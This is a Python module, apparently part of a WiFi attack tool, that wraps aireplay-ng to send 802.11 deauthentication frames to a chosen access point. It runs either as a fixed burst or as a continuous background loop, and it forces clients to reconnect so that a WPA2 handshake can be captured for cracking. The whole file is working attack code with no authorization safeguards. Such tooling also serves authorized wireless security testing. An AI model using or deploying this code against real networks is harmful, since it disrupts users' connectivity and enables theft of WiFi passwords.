"""
core/deauth.py
Sends IEEE 802.11 deauthentication frames to force clients to
reconnect to their access point, triggering a new WPA2 handshake.

What is a deauth attack?
A deauthentication frame is a standard part of the 802.11 WiFi protocol.
It is sent by an AP to disconnect a client. aireplay-ng spoofs these
frames, causing connected clients to briefly disconnect and reconnect —
which produces the WPA2 handshake we need to capture.

Two modes:
- Single burst: Send N deauth packets once
- Continuous:   Keep sending until stopped (used alongside capture)
"""

import subprocess
import threading
import time
import platform
from utils.logger import logger
from utils.validator import validate_device, validate_bssid, validate_packet_count
from utils.commands import build_privileged_cmd, command_exists


class DeauthAttack:
    """Sends deauthentication frames to a target access point."""

    def __init__(self):
        self.system = platform.system()
        self._stop_event = threading.Event()
        self._thread = None
        self._current_process = None
        self._lock = threading.Lock()

    def send_deauth(self, device, bssid, packet_count, log_callback):
        """
        Send a fixed number of deauth packets to the target BSSID.

        Args:
            device:       Wireless interface in monitor mode
            bssid:        Target AP MAC address
            packet_count: Number of deauth frames to send
            log_callback: Function to display status messages
        """
        if self.system != 'Linux':
            log_callback("Deauth attacks are only supported on Linux.")
            return

        if not command_exists('aireplay-ng'):
            log_callback("aireplay-ng not found. Install aircrack-ng package.")
            return

        if not validate_device(device): return
        if not validate_bssid(bssid):   return
        if not validate_packet_count(packet_count): return

        try:
            deauth_cmd = build_privileged_cmd(
                ['aireplay-ng', '--deauth', packet_count, '-a', bssid, device]
            )
            if not deauth_cmd:
                log_callback("No privilege escalation tool found (sudo/doas).")
                return

            subprocess.Popen(
                deauth_cmd,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            log_callback(f"Sent {packet_count} deauth packets to {bssid}")
            logger.info(f"Deauth: sent {packet_count} packets to {bssid}")
        except Exception as e:
            log_callback(f"Error sending deauth: {e}")
            logger.error(f"Deauth error: {e}")

    def start_continuous_deauth(self, device, bssid, log_callback):
        """
        Start a continuous deauth loop in a background thread.
        Sends 5 packets every 2 seconds until stop_continuous_deauth() is called.

        Args:
            device:       Wireless interface in monitor mode
            bssid:        Target AP MAC address
            log_callback: Function to display status messages
        """
        if self.system != 'Linux':
            log_callback("Deauth attacks are only supported on Linux.")
            return

        if not command_exists('aireplay-ng'):
            log_callback("aireplay-ng not found. Install aircrack-ng package.")
            return

        if not validate_device(device): return
        if not validate_bssid(bssid):   return

        if self._thread and self._thread.is_alive():
            log_callback("Continuous deauth is already running.")
            return

        self._stop_event.clear()

        def deauth_loop():
            while not self._stop_event.is_set():
                try:
                    loop_cmd = build_privileged_cmd(
                        ['aireplay-ng', '--deauth', '5', '-a', bssid, device]
                    )
                    if not loop_cmd:
                        log_callback("No privilege escalation tool found (sudo/doas).")
                        return

                    process = subprocess.Popen(
                        loop_cmd,
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL
                    )

                    with self._lock:
                        self._current_process = process

                    while process.poll() is None and not self._stop_event.is_set():
                        time.sleep(0.2)

                    if self._stop_event.is_set() and process.poll() is None:
                        try:
                            process.terminate()
                            process.wait(timeout=2)
                        except Exception:
                            pass

                    with self._lock:
                        self._current_process = None

                    # Small pause between bursts to avoid overly aggressive spam.
                    if not self._stop_event.is_set():
                        time.sleep(1)
                except Exception as e:
                    if not self._stop_event.is_set():
                        log_callback(f"Deauth loop error: {e}")

            with self._lock:
                self._current_process = None

        self._thread = threading.Thread(target=deauth_loop, daemon=True)
        self._thread.start()
        log_callback(f"Continuous deauth started on {bssid}")
        logger.info(f"Continuous deauth started on {bssid}")

    def stop_continuous_deauth(self, log_callback):
        """Stop the continuous deauth loop."""
        was_running = self._thread is not None and self._thread.is_alive()
        self._stop_event.set()

        with self._lock:
            process = self._current_process

        if process and process.poll() is None:
            try:
                process.terminate()
            except Exception:
                pass

        if was_running:
            log_callback("Continuous deauth stopped.")
            logger.info("Continuous deauth stopped.")
